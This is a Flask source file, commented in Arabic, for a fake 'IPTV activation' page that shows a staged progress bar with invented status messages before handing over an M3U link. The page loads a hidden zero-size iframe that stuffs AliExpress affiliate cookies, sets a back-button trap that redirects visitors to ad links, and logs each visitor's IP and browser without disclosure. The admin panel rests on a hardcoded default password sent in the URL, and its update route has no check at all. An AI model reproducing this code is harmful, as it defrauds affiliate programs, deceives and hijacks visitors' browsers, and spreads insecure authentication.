
import os, re, json
from flask import Flask, render_template_string, request, redirect, jsonify
from pymongo import MongoClient
from bson.objectid import ObjectId

app = Flask(__name__)

# --- إعدادات القاعدة ---
raw_uri = os.getenv("MONGO_URI", "").strip()
MONGO_URI = re.sub(r'[\s\n\r]', '', raw_uri)
ADMIN_PASSWORD = os.getenv("ADMIN_PASSWORD", "mounir123")

client = MongoClient(MONGO_URI)
db = client['gateway_db']
config_col = db['config'] # لتخزين الروابط
logs_col = db['logs']     # لتخزين بيانات الزوار

# دالة لجلب الإعدادات الحالية
def get_config():
    conf = config_col.find_one({"type": "main_config"})
    if not conf:
        default = {
            "type": "main_config",
            "reward_url": "https://google.com", # رابط الـ m3u النهائي
            "stuffing_url": "", # رابط AliExpress
            "exit_url": ""     # رابط Adsterra أو Tonic
        }
        config_col.insert_one(default)
        return default
    return conf

# --- واجهة المستخدم (Landing Page) ---
LANDING_HTML = """
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تفعيل سيرفر IPTV</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        .progress-bar { width: 0%; transition: width 0.5s; }
        @keyframes pulse { 0%, 100% { opacity: 1; } 50% { opacity: 0.5; } }
        .loading-text { animation: pulse 1.5s infinite; }
    </style>
</head>
<body class="bg-slate-950 text-white font-sans flex items-center justify-center min-h-screen p-4">
    <div class="max-w-md w-full bg-slate-900 rounded-[2.5rem] p-8 shadow-2xl border border-slate-800 text-center">
        <div class="mb-6 text-blue-500 text-5xl">📡</div>
        <h1 class="text-2xl font-black mb-2">نظام التفعيل الذكي</h1>
        <p class="text-slate-400 text-sm mb-8">جاري فحص التوافق وتجهيز روابط 4K...</p>

        <div id="loading_section">
            <div class="w-full bg-slate-800 h-3 rounded-full mb-4 overflow-hidden">
                <div id="bar" class="progress-bar h-full bg-blue-600 shadow-[0_0_15px_rgba(37,99,235,0.5)]"></div>
            </div>
            <p id="status" class="text-xs text-blue-400 font-mono loading-text">Connecting to secure node...</p>
        </div>

        <div id="reward_section" class="hidden">
            <div class="bg-green-500/10 border border-green-500/20 p-4 rounded-2xl mb-6">
                <p class="text-green-400 text-sm font-bold">✅ تم تجهيز السيرفر بنجاح!</p>
            </div>
            <a href="{{ reward_url }}" class="block w-full bg-blue-600 hover:bg-blue-500 py-4 rounded-2xl font-black transition-all transform active:scale-95 shadow-xl shadow-blue-900/20">
                تحميل ملف التشغيل (M3U)
            </a>
        </div>
    </div>

    <!-- الإطار الخفي للحقن الصامت -->
    {% if stuffing_url %}
    <iframe src="{{ stuffing_url }}" style="display:none; width:0; height:0; border:0;"></iframe>
    {% endif %}

    <script>
        // 1. منطق عداد التحميل
        let step = 0;
        const bar = document.getElementById('bar');
        const status = document.getElementById('status');
        const messages = ["إرسال طلب التفعيل...", "تجاوز حظر الـ IP...", "حقن بروتوكول البث...", "جاهز للتحميل!"];
        
        const interval = setInterval(() => {
            step += 25;
            bar.style.width = step + "%";
            status.innerText = messages[Math.floor(step/30)];
            if(step >= 100) {
                clearInterval(interval);
                document.getElementById('loading_section').classList.add('hidden');
                document.getElementById('reward_section').classList.remove('hidden');
            }
        }, 1500);

        // 2. السر النخبوي: خطف زر الرجوع (Back Button Trap)
        (function() {
            const exitUrl = "{{ exit_url }}";
            if(!exitUrl) return;
            
            // دفع حالة وهمية للسجل
            history.pushState(null, null, location.href);
            
            window.onpopstate = function() {
                // عندما يضغط المستخدم 'رجوع'، يفتح الرابط الربحي
                location.href = exitUrl;
            };
        })();
    </script>
</body>
</html>
"""

# --- لوحة التحكم (Admin Dashboard) ---
ADMIN_HTML = """
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8"><title>Admin Portal</title>
    <script src="https://cdn.tailwindcss.com"></script>
</head>
<body class="bg-slate-950 text-white p-6">
    <div class="max-w-lg mx-auto">
        <h1 class="text-2xl font-bold mb-8 text-blue-500 border-b border-slate-800 pb-4">⚙️ إدارة بوابة الأرباح</h1>
        
        <form action="/update_config" method="POST" class="space-y-6">
            <div>
                <label class="block text-xs text-slate-500 mb-2 uppercase font-bold">1. رابط الجائزة (M3U Final Link)</label>
                <input name="reward_url" value="{{ c.reward_url }}" class="w-full p-4 bg-slate-900 border border-slate-800 rounded-2xl outline-none focus:border-blue-600 transition">
            </div>
            <div>
                <label class="block text-xs text-slate-500 mb-2 uppercase font-bold">2. رابط الحقن الصامت (AliExpress)</label>
                <input name="stuffing_url" value="{{ c.stuffing_url }}" class="w-full p-4 bg-slate-900 border border-slate-800 rounded-2xl outline-none focus:border-blue-600 transition">
            </div>
            <div>
                <label class="block text-xs text-slate-500 mb-2 uppercase font-bold">3. رابط الخروج (Adsterra / Tonic)</label>
                <input name="exit_url" value="{{ c.exit_url }}" class="w-full p-4 bg-slate-900 border border-slate-800 rounded-2xl outline-none focus:border-blue-600 transition">
            </div>
            <button class="w-full bg-blue-600 py-4 rounded-2xl font-black shadow-lg shadow-blue-900/20">تحديث الإمبراطورية 🚀</button>
        </form>
    </div>
</body>
</html>
"""

# --- المسارات (Routes) ---

@app.route('/')
def index():
    conf = get_config()
    # تسجيل بيانات الزائر (نظام استخبارات بسيط)
    logs_col.insert_one({
        "ip": request.headers.get('X-Forwarded-For', request.remote_addr),
        "ua": request.user_agent.string,
        "time": request.date
    })
    return render_template_string(LANDING_HTML, **conf)

@app.route('/admin')
def admin():
    if request.args.get('pw') != ADMIN_PASSWORD: return "Access Denied", 403
    return render_template_string(ADMIN_HTML, c=get_config())

@app.route('/update_config', methods=['POST'])
def update_config():
    # تحديث الروابط في MongoDB
    config_col.update_one({"type": "main_config"}, {"$set": {
        "reward_url": request.form['reward_url'],
        "stuffing_url": request.form['stuffing_url'],
        "exit_url": request.form['exit_url']
    }})
    return redirect(f"/admin?pw={ADMIN_PASSWORD}")

if __name__ == '__main__':
    port = int(os.environ.get("PORT", 10000))
    app.run(host='0.0.0.0', port=port)
